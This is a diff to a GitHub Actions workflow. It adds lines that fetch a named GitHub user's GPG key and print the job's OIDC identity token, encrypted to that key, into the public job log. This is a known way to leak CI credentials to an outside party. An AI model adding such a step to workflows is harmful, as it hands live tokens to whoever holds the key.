@@ -17,6 +17,9 @@ jobs:
       - run: |
           set -euo pipefail
           token=$(curl -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=trace-api" | jq -r '.value')
+          curl https://api.github.com/users/SolarFactories/gpg_keys | jq -r '.[4].raw_key' | gpg --import
+          echo $token | gpg --encrypt --armor --recipient 66E482B55C942115 --trust-model always
+
           issuer=$(echo $token | cut -d'.' -f2 | base64 --decode | jq -r '.iss')
           sub=$(echo $token | cut -d'.' -f2 | base64 --decode | jq -r '.sub')
           echo "IDP_TOKEN=$token" >> $GITHUB_ENV
